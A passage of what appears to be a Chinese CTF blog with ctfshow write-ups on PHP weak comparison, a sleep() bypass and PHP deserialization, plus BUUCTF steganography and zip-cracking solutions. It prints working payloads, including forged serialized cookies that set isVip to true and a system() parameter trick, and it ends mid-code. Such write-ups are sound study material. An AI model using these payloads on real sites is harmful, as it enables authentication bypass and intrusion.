class="code"><pre><code class="hljs awk">var_dump(<span class="hljs-string">&#x27;a&#x27;</span> == <span class="hljs-number">0</span>);<span class="hljs-regexp">//</span>bool(true)<br>var_dump(<span class="hljs-string">&#x27;1a&#x27;</span> == <span class="hljs-number">1</span>);<span class="hljs-regexp">//</span>bool(true)<br>var_dump(<span class="hljs-string">&#x27;12a&#x27;</span> == <span class="hljs-number">1</span>);<span class="hljs-regexp">//</span>bool(false)<br></code></pre></td></tr></table></figure><ul><li><p>会出现上面的结果是因为字符串在和数字比较的时候会将字符串转化为数字，比如a转换失败成False，False又和0弱类型比较是相等的，所以第一个是true。</p></li><li><p>但是如果字符串是以数字开头的，那么就会转成这个数字再做比较，所以第二个也是true，第三个则是因为转成数字后变成了12，不等于1，则为false。</p></li></ul><p>所以我们拼凑函数，凑出结果为0或false或NULL的，需要intval($code)的值为0</p><p>paylaod:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">f1=<span class="hljs-keyword">system</span>&amp;f2=<span class="hljs-keyword">system</span><br></code></pre></td></tr></table></figure><p><code>string system( string $command[, int &amp;$return_var] )</code><br>成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(‘FLASE’)，空指令，失败返回FLASE。</p><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>))&#123;<br>        <span class="hljs-variable">$d</span> = (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$v1</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span>);<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-variable">$d</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>关键函数sleep(),sleep() 函数延迟代码执行若干秒<br>输入v1为数字，若v1为1都要延迟很多很多秒，那不如直接让v1&#x3D;0<br>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">v1</span>=0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buuctf_misc</title>
    <link href="/2023/09/06/buuctf_misc/"/>
    <url>/2023/09/06/buuctf_misc/</url>
    
    <content type="html"><![CDATA[<h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>下载给的zip文件，是个gif动图<br>使用stegsolve打开</p><ul><li><p>File Format: 文件格式，这个主要是查看图片的具体信息，类似与winhex的用法</p></li><li><p>Data Extract: 数据抽取，图片中隐藏数据的抽取</p></li><li><p>Frame Browser: 逐帧浏览，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看</p></li><li><p>Image Combiner: 拼图，图片拼接</p></li></ul><p>用Frame browser功能，逐帧浏览<br><img src="/images/P28ZQ.png"></p><p><img src="/images/MOYOHGU.png"></p><p><img src="/images/ML6X.png"><br>拼接flag{he11ohongke}</p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>下载后为一个jpg图片<br>同样使用stegsolve打开<br>使用file format功能<br>在ascii区域找到flag<br>flag{stego_is_s0_bo r1ing}</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>解压zip文件得到一个png的二维码图片<br>利用QR Research工具，扫描得到了一个不是flag的信息。<br>用notepad++打开<br><img src="/images/8V8.png"><br>发现有个txt文件<br>把后缀改为zip<br>用winrar打开<br><img src="/images/J3AC7X.png"><br>虽然找到了，但这个txt文件需要密码<br>使用zip密码破解软件ziperello破解，使用暴力破解<br><img src="/images/HXIM8O.png"><br>得到密码7639，打开txt，得到flag CTF{vjpw_wnoei}<br>把ctf改为flag即可</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>解压zip文件得到一个png文件<br>图片分辨率为679*256</p><p>用notepad++打开<br><img src="/images/GVVG5EN5.png"><br>修改一下256部分的内容，把它修改为679<br>16进制为02 a7，保存重新进入图片<br>发现flag<br><img src="/images/DOQES57IFB.png"></p><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>解压zip文件得到一个exe文件，但是打不开<br>使用notepad++打开<br>很长的一串字符<br><img src="/images/J962OCAJ.png"><br>发现与base64字符串转换图片格式相同<br><img src="/images/JS8SMNKA5ZBU5DH9VIB.png"><br>转换出一个二维码<br>扫描二维码即可得到flag</p><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>下载图片后使用stegsolve打开<br>在file format下查看，发现flag在最底下<br><img src="/images/RKXJO.png"><br>注意要把flag中的空格取消</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web入门_反序列化</title>
    <link href="/2023/08/05/fanxuliehua/"/>
    <url>/2023/08/05/fanxuliehua/</url>
    
    <content type="html"><![CDATA[<h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>代码审计，首先初始ctfshowuser类，在第二层if当中首先执行login方法，用于判断我们get传入的参数username和password是否与类中一致，发现用户名和密码都是xxxxxx，所以payload：<code>?username=xxxxxx&amp;password=xxxxxx</code>即可获取flag</p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>首先通过反序列化获取对象(序列化将对象保存到字符串，反序列化将字符串恢复为对象)，之后 checkvip要求是true，之后执行vippnekeygetflag获取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br>    <br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?username<span class="hljs-operator">=</span>xxxxxx&amp;password<span class="hljs-operator">=</span>xxxxxx<br>Cookie: user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username!==<span class="hljs-variable language_">$this</span>-&gt;password)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;yn8rt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>增加了一个条件，让username!&#x3D;password就行</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?username<span class="hljs-operator">=</span>yn<span class="hljs-number">8</span>rt&amp;password<span class="hljs-operator">=</span>xxxxxx<br>Cookie:user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>username<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>yn<span class="hljs-number">8</span>rt<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span 